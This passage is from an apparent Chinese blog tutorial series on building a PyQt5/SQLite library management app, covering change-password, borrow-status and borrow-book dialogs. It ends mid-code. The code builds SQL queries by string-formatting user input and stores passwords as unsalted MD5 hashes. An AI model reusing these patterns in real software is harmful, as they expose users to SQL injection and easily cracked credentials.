  def myBookStatusClicked(self):</span><br><span class="line">        self.layout.removeWidget(self.storageView)</span><br><span class="line">        sip.delete(self.storageView)</span><br><span class="line">        self.storageView &#x3D; BookStorageViewer()</span><br><span class="line">        self.borrowStatusView &#x3D; BorrowStatusViewer(self.StudentId)</span><br><span class="line">        self.layout.addWidget(self.borrowStatusView)</span><br><span class="line">        self.allBookButton.setEnabled(True)</span><br><span class="line">        self.myBookStatus.setEnabled(False)</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    def allBookButtonClicked(self):</span><br><span class="line">        self.layout.removeWidget(self.borrowStatusView)</span><br><span class="line">        sip.delete(self.borrowStatusView)</span><br><span class="line">        self.borrowStatusView &#x3D; BorrowStatusViewer(self.StudentId)</span><br><span class="line">        self.storageView &#x3D; BookStorageViewer()</span><br><span class="line">        self.layout.addWidget(self.storageView)</span><br><span class="line">        self.allBookButton.setEnabled(False)</span><br><span class="line">        self.myBookStatus.setEnabled(True)</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    app &#x3D; QApplication(sys.argv)</span><br><span class="line">    app.setWindowIcon(QIcon(&quot;.&#x2F;images&#x2F;MainWindow_1.png&quot;))</span><br><span class="line">    app.setStyleSheet(qdarkstyle.load_stylesheet_pyqt5())</span><br><span class="line">    mainMindow &#x3D; StudentHome(&quot;PB15000135&quot;)</span><br><span class="line">    mainMindow.show()</span><br><span class="line">    sys.exit(app.exec_())</span><br></pre></td></tr></table></figure><h3><span id="pshi-xian-xiao-guo">实现效果</span><a href="#pshi-xian-xiao-guo" class="header-anchor">#</a></h3><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdb9he6lrej30p20hlgmp.jpg" alt="这里写图片描述"><br><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdb9hejm84j30p10hlmy8.jpg" alt="这里写图片描述"><br><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdb9hf008bj30p50hpq3m.jpg" alt="这里写图片描述"></p><h2><span id="pxiu-gai-mi-ma-gong-neng">修改密码功能</span><a href="#pxiu-gai-mi-ma-gong-neng" class="header-anchor">#</a></h2><blockquote><p>修改密码功能使用菜单栏<code>QAction</code>点击启动</p></blockquote><h3><span id="pfen-xi">分析</span><a href="#pfen-xi" class="header-anchor">#</a></h3><p>修改密码，主要需要用户输入学号， 原密码，新密码，确认密码实现<br>代码逻辑如下：</p><ul><li>确认学号与原密码对应，否则报错</li><li>输入新密码与确认密码 ，如果相同，则md5加密后放入数据库中</li><li>注意设置输入校验</li></ul><p>使用对话框实现</p><h3><span id="pdai-ma-shi-xian">代码实现</span><a href="#pdai-ma-shi-xian" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line">from PyQt5.QtWidgets import *</span><br><span class="line">from PyQt5.QtGui import *</span><br><span class="line">from PyQt5.QtCore import *</span><br><span class="line">import qdarkstyle</span><br><span class="line">import time</span><br><span class="line">from PyQt5.QtSql import *</span><br><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class changePasswordDialog(QDialog):</span><br><span class="line">    def __init__(self, parent&#x3D;None):</span><br><span class="line">        super(changePasswordDialog, self).__init__(parent)</span><br><span class="line">        self.setWindowModality(Qt.WindowModal)</span><br><span class="line">        self.setWindowTitle(&quot;修改密码&quot;)</span><br><span class="line">        self.setUpUI()</span><br><span class="line"></span><br><span class="line">    def setUpUI(self):</span><br><span class="line">        self.resize(300, 280)</span><br><span class="line">        self.layout &#x3D; QFormLayout()</span><br><span class="line">        self.setLayout(self.layout)</span><br><span class="line"></span><br><span class="line">        self.titlelabel &#x3D; QLabel(&quot; 修改密码&quot;)</span><br><span class="line">        self.studentIdLabel &#x3D; QLabel(&quot;学    号：&quot;)</span><br><span class="line">        # self.studentNameLabel&#x3D;QLabel(&quot;姓    名：&quot;)</span><br><span class="line">        self.oldPasswordLabel &#x3D; QLabel(&quot;旧 密 码：&quot;)</span><br><span class="line">        self.passwordLabel &#x3D; QLabel(&quot;新 密 码：&quot;)</span><br><span class="line">        self.confirmPasswordLabel &#x3D; QLabel(&quot;确认密码：&quot;)</span><br><span class="line"></span><br><span class="line">        self.studentIdEdit &#x3D; QLineEdit()</span><br><span class="line">        # self.studentNameEdit&#x3D;QLineEdit()</span><br><span class="line">        self.oldPasswordEdit &#x3D; QLineEdit()</span><br><span class="line">        self.passwordEdit &#x3D; QLineEdit()</span><br><span class="line">        self.confirmPasswordEdit &#x3D; QLineEdit()</span><br><span class="line"></span><br><span class="line">        self.changePasswordButton &#x3D; QPushButton(&quot;确认修改&quot;)</span><br><span class="line">        self.changePasswordButton.setFixedWidth(140)</span><br><span class="line">        self.changePasswordButton.setFixedHeight(32)</span><br><span class="line"></span><br><span class="line">        self.layout.addRow(&quot;&quot;, self.titlelabel)</span><br><span class="line">        self.layout.addRow(self.studentIdLabel, self.studentIdEdit)</span><br><span class="line">        # self.layout.addRow(self.studentNameLabel,self.studentNameEdit)</span><br><span class="line">        self.layout.addRow(self.oldPasswordLabel, self.oldPasswordEdit)</span><br><span class="line">        self.layout.addRow(self.passwordLabel, self.passwordEdit)</span><br><span class="line">        self.layout.addRow(self.confirmPasswordLabel, self.confirmPasswordEdit)</span><br><span class="line">        self.layout.addRow(&quot;&quot;, self.changePasswordButton)</span><br><span class="line"></span><br><span class="line">        font &#x3D; QFont()</span><br><span class="line">        font.setPixelSize(20)</span><br><span class="line">        self.titlelabel.setFont(font)</span><br><span class="line">        font.setPixelSize(16)</span><br><span class="line">        self.studentIdLabel.setFont(font)</span><br><span class="line">        # self.studentNameLabel.setFont(font)</span><br><span class="line">        self.oldPasswordLabel.setFont(font)</span><br><span class="line">        self.passwordLabel.setFont(font)</span><br><span class="line">        self.confirmPasswordLabel.setFont(font)</span><br><span class="line"></span><br><span class="line">        font.setPixelSize(16)</span><br><span class="line">        self.studentIdEdit.setFont(font)</span><br><span class="line">        self.changePasswordButton.setFont(font)</span><br><span class="line">        # self.studentNameEdit.setFont(font)</span><br><span class="line">        font.setPixelSize(10)</span><br><span class="line">        self.oldPasswordEdit.setFont(font)</span><br><span class="line">        self.passwordEdit.setFont(font)</span><br><span class="line">        self.confirmPasswordEdit.setFont(font)</span><br><span class="line"></span><br><span class="line">        self.titlelabel.setMargin(8)</span><br><span class="line">        self.layout.setVerticalSpacing(10)</span><br><span class="line"></span><br><span class="line">        # 设置长度</span><br><span class="line">        self.studentIdEdit.setMaxLength(10)</span><br><span class="line">        self.oldPasswordEdit.setMaxLength(16)</span><br><span class="line">        self.passwordEdit.setMaxLength(16)</span><br><span class="line">        self.confirmPasswordEdit.setMaxLength(16)</span><br><span class="line">        # 设置密码掩膜</span><br><span class="line">        self.oldPasswordEdit.setEchoMode(QLineEdit.Password)</span><br><span class="line">        self.passwordEdit.setEchoMode(QLineEdit.Password)</span><br><span class="line">        self.confirmPasswordEdit.setEchoMode(QLineEdit.Password)</span><br><span class="line"></span><br><span class="line">        # 设置校验</span><br><span class="line">        reg &#x3D; QRegExp(&quot;PB[0~9]&#123;8&#125;&quot;)</span><br><span class="line">        pValidator &#x3D; QRegExpValidator(self)</span><br><span class="line">        pValidator.setRegExp(reg)</span><br><span class="line">        self.studentIdEdit.setValidator(pValidator)</span><br><span class="line"></span><br><span class="line">        reg &#x3D; QRegExp(&quot;[a-zA-z0-9]+$&quot;)</span><br><span class="line">        pValidator.setRegExp(reg)</span><br><span class="line">        self.oldPasswordEdit.setValidator(pValidator)</span><br><span class="line">        self.passwordEdit.setValidator(pValidator)</span><br><span class="line">        self.confirmPasswordEdit.setValidator(pValidator)</span><br><span class="line"></span><br><span class="line">        # 设置信号与槽</span><br><span class="line">        self.changePasswordButton.clicked.connect(self.changePasswordButtonClicked)</span><br><span class="line"></span><br><span class="line">    def changePasswordButtonClicked(self):</span><br><span class="line">        studentId &#x3D; self.studentIdEdit.text()</span><br><span class="line">        oldPassword &#x3D; self.oldPasswordEdit.text()</span><br><span class="line">        password &#x3D; self.passwordEdit.text()</span><br><span class="line">        confirmPassword &#x3D; self.confirmPasswordEdit.text()</span><br><span class="line">        if (studentId &#x3D;&#x3D; &quot;&quot; or oldPassword &#x3D;&#x3D; &quot;&quot; or password &#x3D;&#x3D; &quot;&quot; or confirmPassword &#x3D;&#x3D; &quot;&quot;):</span><br><span class="line">            print(QMessageBox.warning(self, &quot;警告&quot;, &quot;输入不可为空，请重新输入&quot;, QMessageBox.Yes, QMessageBox.Yes))</span><br><span class="line">            return</span><br><span class="line">        db &#x3D; QSqlDatabase.addDatabase(&quot;QSQLITE&quot;)</span><br><span class="line">        db.setDatabaseName(&#39;.&#x2F;db&#x2F;LibraryManagement.db&#39;)</span><br><span class="line">        db.open()</span><br><span class="line">        query &#x3D; QSqlQuery()</span><br><span class="line">        sql &#x3D; &quot;SELECT * FROM User WHERE StudentId&#x3D;&#39;%s&#39;&quot; % studentId</span><br><span class="line">        query.exec_(sql)</span><br><span class="line">        # 如果用户不存在</span><br><span class="line">        if (not query.next()):</span><br><span class="line">            print(QMessageBox.warning(self, &quot;警告&quot;, &quot;该用户不存在，请重新输入&quot;, QMessageBox.Yes, QMessageBox.Yes))</span><br><span class="line">            self.studentIdEdit.clear()</span><br><span class="line">            return</span><br><span class="line">            # 如果密码错误</span><br><span class="line">        hl &#x3D; hashlib.md5()</span><br><span class="line">        hl.update(oldPassword.encode(encoding&#x3D;&#39;utf-8&#39;))</span><br><span class="line">        md5password &#x3D; hl.hexdigest()</span><br><span class="line">        sql &#x3D; &quot;SELECT * FROM User WHERE Password&#x3D;&#39;%s&#39; AND StudentId&#x3D;&#39;%s&#39;&quot; %(md5password,studentId)</span><br><span class="line">        query.exec_(sql)</span><br><span class="line">        if (not query.next()):</span><br><span class="line">            print(QMessageBox.warning(self, &quot;警告&quot;, &quot;原密码输入错误,请重新输入&quot;, QMessageBox.Yes, QMessageBox.Yes))</span><br><span class="line">            self.oldPasswordEdit.clear()</span><br><span class="line">            return</span><br><span class="line">        # 密码与确认密码不同</span><br><span class="line">        if(password!&#x3D;confirmPassword):</span><br><span class="line">            print(QMessageBox.warning(self,&quot;警告&quot;,&quot;两次输入密码不同,请确认输入&quot;,QMessageBox.Yes,QMessageBox.Yes))</span><br><span class="line">            self.passwordEdit.clear()</span><br><span class="line">            self.confirmPasswordEdit.clear()</span><br><span class="line">            return</span><br><span class="line">        # 修改密码</span><br><span class="line">        hl &#x3D; hashlib.md5()</span><br><span class="line">        hl.update(password.encode(encoding&#x3D;&#39;utf-8&#39;))</span><br><span class="line">        md5password &#x3D; hl.hexdigest()</span><br><span class="line">        sql&#x3D;&quot;UPDATE User SET Password&#x3D;&#39;%s&#39; WHERE StudentId&#x3D;&#39;%s&#39;&quot;%(md5password,studentId)</span><br><span class="line">        query.exec_(sql)</span><br><span class="line">        db.commit()</span><br><span class="line">        QMessageBox.information(self,&quot;提醒&quot;,&quot;修改密码成功，请登录系统!&quot;,QMessageBox.Yes,QMessageBox.Yes)</span><br><span class="line">        self.close()</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    app &#x3D; QApplication(sys.argv)</span><br><span class="line">    app.setWindowIcon(QIcon(&quot;.&#x2F;images&#x2F;MainWindow_1.png&quot;))</span><br><span class="line">    app.setStyleSheet(qdarkstyle.load_stylesheet_pyqt5())</span><br><span class="line">    mainMindow &#x3D; changePasswordDialog()</span><br><span class="line">    mainMindow.show()</span><br><span class="line">    sys.exit(app.exec_())</span><br></pre></td></tr></table></figure><h3><span id="pshi-xian-xiao-guo">实现效果</span><a href="#pshi-xian-xiao-guo" class="header-anchor">#</a></h3><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdb9hdmznij308e08rq2u.jpg" alt="这里写图片描述"><br><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdb9hd0pdgj308d08s3yj.jpg" alt="这里写图片描述"></p><h2><span id="pzui-hou-fu-shang-lian-jie">最后附上链接</span><a href="#pzui-hou-fu-shang-lian-jie" class="header-anchor">#</a></h2><p>项目地址：<a href="https://github.com/ycdxsb/LibraryManageDesktopApp" target="_blank" rel="noopener">github仓库链接</a></p>]]></content>
      <categories>
        <category>PyQt5</category>
        <category>图书馆管理系统</category>
      </categories>
      <tags>
        <tag>PyQt5</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>PyQt5搭建图书馆管理系统（9）——借阅状态查询</title>
    <url>/5ec72e4f.html</url>
    <content><![CDATA[<h2><span id="pfen-xi">分析</span><a href="#pfen-xi" class="header-anchor">#</a></h2><p>这个可以说是实现的最简单的一个功能了，只需要结合一下<code>QTableView</code>和<code>QSqlQueryModel</code>对<code>User_Book</code>表和<code>Book</code>表做一个联查即可，直接贴上代码如下</p><a id="more"></a><h2><span id="pdai-ma">代码</span><a href="#pdai-ma" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line">from PyQt5.QtWidgets import *</span><br><span class="line">from PyQt5.QtGui import *</span><br><span class="line">from PyQt5.QtCore import Qt</span><br><span class="line">import qdarkstyle</span><br><span class="line">from PyQt5.QtSql import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class BorrowStatusViewer(QWidget):</span><br><span class="line">    def __init__(self, studentId):</span><br><span class="line">        super(BorrowStatusViewer, self).__init__()</span><br><span class="line">        self.resize(700, 500)</span><br><span class="line">        self.studentId &#x3D; studentId</span><br><span class="line">        self.setWindowTitle(&quot;欢迎使用图书馆管理系统&quot;)</span><br><span class="line">        self.setUpUI()</span><br><span class="line"></span><br><span class="line">    def setUpUI(self):</span><br><span class="line">        self.db &#x3D; QSqlDatabase.addDatabase(&quot;QSQLITE&quot;)</span><br><span class="line">        self.db.setDatabaseName(&#39;.&#x2F;db&#x2F;LibraryManagement.db&#39;)</span><br><span class="line">        self.db.open()</span><br><span class="line">        # 分为两块，上方是已借未归还书，下方是已归还书</span><br><span class="line">        self.layout &#x3D; QVBoxLayout(self)</span><br><span class="line">        # Label设置</span><br><span class="line">        self.borrowedLabel &#x3D; QLabel(&quot;未归还:&quot;)</span><br><span class="line">        self.returnedLabel &#x3D; QLabel(&quot;已归还:&quot;)</span><br><span class="line">        self.borrowedLabel.setFixedHeight(32)</span><br><span class="line">        self.borrowedLabel.setFixedWidth(60)</span><br><span class="line">        self.returnedLabel.setFixedHeight(32)</span><br><span class="line">        self.returnedLabel.setFixedWidth(60)</span><br><span class="line">        font &#x3D; QFont()</span><br><span class="line">        font.setPixelSize(18)</span><br><span class="line">        self.borrowedLabel.setFont(font)</span><br><span class="line">        self.returnedLabel.setFont(font)</span><br><span class="line"></span><br><span class="line">        # Table和Model</span><br><span class="line">        self.borrowedTableView &#x3D; QTableView()</span><br><span class="line">        self.borrowedTableView.horizontalHeader().setStretchLastSection(True)</span><br><span class="line">        self.borrowedTableView.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)</span><br><span class="line">        self.borrowedTableView.setEditTriggers(QAbstractItemView.NoEditTriggers)</span><br><span class="line">        self.returnedTableView &#x3D; QTableView()</span><br><span class="line">        self.returnedTableView.horizontalHeader().setStretchLastSection(True)</span><br><span class="line">        self.returnedTableView.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)</span><br><span class="line">        self.returnedTableView.setEditTriggers(QAbstractItemView.NoEditTriggers)</span><br><span class="line"></span><br><span class="line">        self.borrowedQueryModel &#x3D; QSqlQueryModel()</span><br><span class="line">        self.returnedQueryModel &#x3D; QSqlQueryModel()</span><br><span class="line">        self.borrowedTableView.setModel(self.borrowedQueryModel)</span><br><span class="line">        self.returnedTableView.setModel(self.returnedQueryModel)</span><br><span class="line">        self.borrowedQuery()</span><br><span class="line">        self.borrowedQueryModel.setHeaderData(0, Qt.Horizontal, &quot;书名&quot;)</span><br><span class="line">        self.borrowedQueryModel.setHeaderData(1, Qt.Horizontal, &quot;书号&quot;)</span><br><span class="line">        self.borrowedQueryModel.setHeaderData(2, Qt.Horizontal, &quot;作者&quot;)</span><br><span class="line">        self.borrowedQueryModel.setHeaderData(3, Qt.Horizontal, &quot;分类&quot;)</span><br><span class="line">        self.borrowedQueryModel.setHeaderData(4, Qt.Horizontal, &quot;出版社&quot;)</span><br><span class="line">        self.borrowedQueryModel.setHeaderData(5, Qt.Horizontal, &quot;出版时间&quot;)</span><br><span class="line">        self.borrowedQueryModel.setHeaderData(6, Qt.Horizontal, &quot;借出时间&quot;)</span><br><span class="line"></span><br><span class="line">        self.returnedQuery()</span><br><span class="line">        self.returnedQueryModel.setHeaderData(0, Qt.Horizontal, &quot;书名&quot;)</span><br><span class="line">        self.returnedQueryModel.setHeaderData(1, Qt.Horizontal, &quot;书号&quot;)</span><br><span class="line">        self.returnedQueryModel.setHeaderData(2, Qt.Horizontal, &quot;作者&quot;)</span><br><span class="line">        self.returnedQueryModel.setHeaderData(3, Qt.Horizontal, &quot;分类&quot;)</span><br><span class="line">        self.returnedQueryModel.setHeaderData(4, Qt.Horizontal, &quot;出版社&quot;)</span><br><span class="line">        self.returnedQueryModel.setHeaderData(5, Qt.Horizontal, &quot;出版时间&quot;)</span><br><span class="line">        self.returnedQueryModel.setHeaderData(6, Qt.Horizontal, &quot;借阅时间&quot;)</span><br><span class="line">        self.returnedQueryModel.setHeaderData(7, Qt.Horizontal, &quot;归还时间&quot;)</span><br><span class="line"></span><br><span class="line">        self.layout.addWidget(self.borrowedLabel)</span><br><span class="line">        self.layout.addWidget(self.borrowedTableView)</span><br><span class="line">        self.layout.addWidget(self.returnedLabel)</span><br><span class="line">        self.layout.addWidget(self.returnedTableView)</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    def borrowedQuery(self):</span><br><span class="line">        sql &#x3D; &quot;SELECT Book.BookName,Book.BookId,Auth,Category,Publisher,PublishTime,BorrowTime  FROM Book,User_Book WHERE Book.BookId&#x3D;User_Book.BookId AND User_Book.BorrowState&#x3D;1 AND StudentId&#x3D;&#39;%s&#39;&quot; % self.studentId</span><br><span class="line">        self.borrowedQueryModel.setQuery(sql)</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    def returnedQuery(self):</span><br><span class="line">        sql &#x3D; &quot;SELECT Book.BookName,Book.BookId,Auth,Category,Publisher,PublishTime,BorrowTime,ReturnTime  FROM Book,User_Book WHERE Book.BookId&#x3D;User_Book.BookId AND User_Book.BorrowState&#x3D;0 AND StudentId&#x3D;&#39;%s&#39;&quot; % self.studentId</span><br><span class="line">        self.returnedQueryModel.setQuery(sql)</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    app &#x3D; QApplication(sys.argv)</span><br><span class="line">    app.setWindowIcon(QIcon(&quot;.&#x2F;images&#x2F;MainWindow_1.png&quot;))</span><br><span class="line">    app.setStyleSheet(qdarkstyle.load_stylesheet_pyqt5())</span><br><span class="line">    mainMindow &#x3D; BorrowStatusViewer(&quot;PB15000135&quot;)</span><br><span class="line">    mainMindow.show()</span><br><span class="line">    sys.exit(app.exec_())</span><br></pre></td></tr></table></figure><h2><span id="pshi-xian-xiao-guo">实现效果</span><a href="#pshi-xian-xiao-guo" class="header-anchor">#</a></h2><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdb9e92wkxj30jl0etaan.jpg" alt="Alt text"></p><h2><span id="pzui-hou-fu-shang-lian-jie">最后附上链接</span><a href="#pzui-hou-fu-shang-lian-jie" class="header-anchor">#</a></h2><p>项目地址：<a href="https://github.com/ycdxsb/LibraryManageDesktopApp" target="_blank" rel="noopener">github仓库链接</a></p>]]></content>
      <categories>
        <category>PyQt5</category>
        <category>图书馆管理系统</category>
      </categories>
      <tags>
        <tag>PyQt5</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>PyQt5搭建图书馆管理系统（8）——借书/还书功能</title>
    <url>/8effeb9b.html</url>
    <content><![CDATA[<h2><span id="pjie-shu-gong-neng-shi-xian">借书功能实现</span><a href="#pjie-shu-gong-neng-shi-xian" class="header-anchor">#</a></h2><h3><span id="pfen-xi">分析</span><a href="#pfen-xi" class="header-anchor">#</a></h3><p>本来借书的信息都是应该有RFID识别得到的，但是作为大作业，只能让用户输入信息了，但是书名之类的都不唯一，所以采取了与淘汰书籍一样的操作——让用户输入书号，自动匹配书本信息，然后确认借阅</p><p>借阅时，需要处理的逻辑如下：</p><ul><li>用户输入的书号存在，就匹配信息给用户</li><li>不存在就点击借阅，给出警告</li><li>借阅书籍数已经达到上限5本 ，给出警告</li><li>不允许借阅同样的书</li><li>更新<code>Book</code>表信息的借阅次数，剩余可借阅书数</li><li>在<code>User_Book</code>表插入记录</li><li>借阅成功给出提示</li></ul><a id="more"></a><h3><span id="pdai-ma-shi-xian">代码实现</span><a href="#pdai-ma-shi-xian" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line">from PyQt5.QtWidgets import *</span><br><span class="line">from PyQt5.QtGui import *</span><br><span class="line">from PyQt5.QtCore import *</span><br><span class="line">import qdarkstyle</span><br><span class="line">import time</span><br><span class="line">from PyQt5.QtSql import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class borrowBookDialog(QDialog):</span><br><span class="line">    borrow_book_success_signal &#x3D; pyqtSignal()</span><br><span class="line"></span><br><span class="line">    def __init__(self, StudentId, parent&#x3D;None):</span><br><span class="line">        super(borrowBookDialog, self).__init__(parent)</span><br><span class="line">        self.studentId &#x3D; StudentId</span><br><span class="line">        self.setUpUI()</span><br><span class="line">        self.setWindowModality(Qt.WindowModal)</span><br><span class="line">        self.setWindowTitle(&quot;借阅书籍&quot;)</span><br><span class="line"></span><br><span class="line">    def setUpUI(self):</span><br><span class="line">        # 书名，书号，作者，分类，添加数量.出版社,出版日期</span><br><span class="line">        # 书籍分类：哲学类、社会科学类、政治类、法律类、军事类、经济类、文化类、教育类、体育类、语言文字类、艺术类、历史类、地理类、天文学类、生物学类、医学卫生类、农业类</span><br><span class="line">        BookCategory &#x3D; [&quot;哲学&quot;, &quot;社会科学&quot;, &quot;政治&quot;, &quot;法律&quot;, &quot;军事&quot;, &quot;经济&quot;, &quot;文化&quot;, &quot;教育&quot;, &quot;体育&quot;, &quot;语言文字&quot;, &quot;艺术&quot;, &quot;历史&quot;</span><br><span class="line">            , &quot;地理&quot;, &quot;天文学&quot;, &quot;生物学&quot;, &quot;医学卫生&quot;, &quot;农业&quot;]</span><br><span class="line">        self.resize(300, 400)</span><br><span class="line">        self.layout &#x3D; QFormLayout()</span><br><span class="line">        self.setLayout(self.layout)</span><br><span class="line"></span><br><span class="line">        # Label控件</span><br><span class="line">        self.borrowStudentLabel &#x3D; QLabel(&quot;借 阅 人:&quot;)</span><br><span class="line">        self.borrowStudentIdLabel &#x3D; QLabel(self.studentId)</span><br><span class="line">        self.titlelabel &#x3D; QLabel(&quot;  借阅书籍&quot;)</span><br><span class="line">        self.bookNameLabel &#x3D; QLabel(&quot;书    名:&quot;)</span><br><span class="line">        self.bookIdLabel &#x3D; QLabel(&quot;书    号:&quot;)</span><br><span class="line">        self.authNameLabel &#x3D; QLabel(&quot;作    者:&quot;)</span><br><span class="line">        self.categoryLabel &#x3D; QLabel(&quot;分    类:&quot;)</span><br><span class="line">        self.publisherLabel &#x3D; QLabel(&quot;出 版 社:&quot;)</span><br><span class="line">        self.publishDateLabel &#x3D; QLabel(&quot;出版日期:&quot;)</span><br><span class="line"></span><br><span class="line">        # button控件</span><br><span class="line">        self.borrowBookButton &#x3D; QPushButton(&quot;确认借阅&quot;)</span><br><span class="line"></span><br><span class="line">        # lineEdit控件</span><br><span class="line">        self.bookNameEdit &#x3D; QLineEdit()</span><br><span class="line">        self.bookIdEdit &#x3D; QLineEdit()</span><br><span class="line">        self.authNameEdit &#x3D; QLineEdit()</span><br><span class="line">        self.categoryComboBox &#x3D; QComboBox()</span><br><span class="line">        self.categoryComboBox.addItems(BookCategory)</span><br><span class="line">        self.publisherEdit &#x3D; QLineEdit()</span><br><span class="line">        self.publishTime &#x3D; QLineEdit()</span><br><span class="line"></span><br><span class="line">        self.bookNameEdit.setMaxLength(10)</span><br><span class="line">        self.bookIdEdit.setMaxLength(6)</span><br><span class="line">        self.authNameEdit.setMaxLength(10)</span><br><span class="line">        self.publisherEdit.setMaxLength(10)</span><br><span class="line"></span><br><span class="line">        # 添加进formlayout</span><br><span class="line">        self.layout.addRow(&quot;&quot;, self.titlelabel)</span><br><span class="line">        self.layout.addRow(self.borrowStudentLabel, self.borrowStudentIdLabel)</span><br><span class="line">        self.layout.addRow(self.bookNameLabel, self.bookNameEdit)</span><br><span class="line">        self.layout.addRow(self.bookIdLabel, self.bookIdEdit)</span><br><span class="line">        self.layout.addRow(self.authNameLabel, self.authNameEdit)</span><br><span class="line">        self.layout.addRow(self.categoryLabel, self.categoryComboBox)</span><br><span class="line">        self.layout.addRow(self.publisherLabel, self.publisherEdit)</span><br><span class="line">        self.layout.addRow(self.publishDateLabel, self.publishTime)</span><br><span class="line">        self.layout.addRow(&quot;&quot;, self.borrowBookButton)</span><br><span class="line"></span><br><span class="line">        # 设置字体</span><br><span class="line">        font &#x3D; QFont()</span><br><span class="line">        font.setPixelSize(20)</span><br><span class="line">        self.titlelabel.setFont(font)</span><br><span class="line">        font.setPixelSize(16)</span><br><span class="line">        self.borrowStudentIdLabel.setFont(font)</span><br><span class="line">        font.setPixelSize(14)</span><br><span class="line">        self.borrowStudentLabel.setFont(font)</span><br><span class="line">        self.bookNameLabel.setFont(font)</span><br><span class="line">        self.bookIdLabel.setFont(font)</span><br><span class="line">        self.authNameLabel.setFont(font)</span><br><span class="line">        self.categoryLabel.setFont(font)</span><br><span class="line">        self.publisherLabel.setFont(font)</span><br><span class="line">        self.publishDateLabel.setFont(font)</span><br><span class="line"></span><br><span class="line">        self.bookNameEdit.setFont(font)</span><br><span class="line">        self.bookNameEdit.setReadOnly(True)</span><br><span class="line">        self.bookNameEdit.setStyleSheet(&quot;background-color:#363636&quot;)</span><br><span class="line">        self.bookIdEdit.setFont(font)</span><br><span class="line">        self.authNameEdit.setFont(font)</span><br><span class="line">        self.authNameEdit.setReadOnly(True)</span><br><span class="line">        self.authNameEdit.setStyleSheet(&quot;background-color:#363636&quot;)</span><br><span class="line">        self.publisherEdit.setFont(font)</span><br><span class="line">        self.publisherEdit.setReadOnly(True)</span><br><span class="line">        self.publisherEdit.setStyleSheet(&quot;background-color:#363636&quot;)</span><br><span class="line">        self.publishTime.setFont(font)</span><br><span class="line">        self.publishTime.setStyleSheet(&quot;background-color:#363636&quot;)</span><br><span class="line">        self.categoryComboBox.setFont(font)</span><br><span class="line">        self.categoryComboBox.setStyleSheet(&quot;background-color:#363636&quot;)</span><br><span class="line"></span><br><span class="line">        # button设置</span><br><span class="line">        font.setPixelSize(16)</span><br><span class="line">        self.borrowBookButton.setFont(font)</span><br><span class="line">        self.borrowBookButton.setFixedHeight(32)</span><br><span class="line">        self.borrowBookButton.setFixedWidth(140)</span><br><span class="line"></span><br><span class="line">        # 设置间距</span><br><span class="line">        self.titlelabel.setMargin(8)</span><br><span class="line">        self.layout.setVerticalSpacing(10)</span><br><span class="line">        self.borrowBookButton.clicked.connect(self.borrowButtonClicked)</span><br><span class="line">        self.bookIdEdit.textChanged.connect(self.bookIdEditChanged)</span><br><span class="line">        self.bookIdEdit.returnPressed.connect(self.borrowButtonClicked)</span><br><span class="line"></span><br><span class="line">    def borrowButtonClicked(self):</span><br><span class="line">        # 获取书号，书号为空或不存在库中，则弹出错误</span><br><span class="line">        # 向Book_User表插入记录，更新User表以及Book表</span><br><span class="line">        BookId &#x3D; self.bookIdEdit.text()</span><br><span class="line">        # BookId为空的处理</span><br><span class="line">        if (BookId &#x3D;&#x3D; &quot;&quot;):</span><br><span class="line">            print(QMessageBox.warning(self, &quot;警告&quot;, &quot;你所要借的书不存在，请查看输入&quot;, QMessageBox.Yes, QMessageBox.Yes))</span><br><span class="line">            return</span><br><span class="line">        # 打开数据库</span><br><span class="line">        db &#x3D; db &#x3D; QSqlDatabase.addDatabase(&quot;QSQLITE&quot;)</span><br><span class="line">        db.setDatabaseName(&#39;.&#x2F;db&#x2F;LibraryManagement.db&#39;)</span><br><span class="line">        db.open()</span><br><span class="line">        query &#x3D; QSqlQuery()</span><br><span class="line">        # 如果BookId不存在</span><br><span class="line">        sql &#x3D; &quot;SELECT * FROM Book WHERE BookId&#x3D;&#39;%s&#39;&quot; % BookId</span><br><span class="line">        query.exec_(sql)</span><br><span class="line">        if (not query.next()):</span><br><span class="line">            print(QMessageBox.warning(self, &quot;警告&quot;, &quot;你所要借的书不存在，请查看输入&quot;, QMessageBox.Yes, QMessageBox.Yes))</span><br><span class="line">            return</span><br><span class="line"></span><br><span class="line">        # 借书上限5本</span><br><span class="line">        sql &#x3D; &quot;SELECT COUNT(StudentId) FROM User_Book WHERE StudentId&#x3D;&#39;%s&#39; AND BorrowState&#x3D;1&quot; % (</span><br><span class="line">            self.studentId)</span><br><span class="line">        query.exec_(sql)</span><br><span class="line">        if (query.next()):</span><br><span class="line">            borrowNum &#x3D; query.value(0)</span><br><span class="line">            if (borrowNum &#x3D;&#x3D; 5):</span><br><span class="line">                QMessageBox.warning(self, &quot;警告&quot;, &quot;您借阅的书达到上限（5本）,借书失败！&quot;, QMessageBox.Yes, QMessageBox.Yes)</span><br><span class="line">                return</span><br><span class="line">        # 不允许重复借书</span><br><span class="line">        sql &#x3D; &quot;SELECT 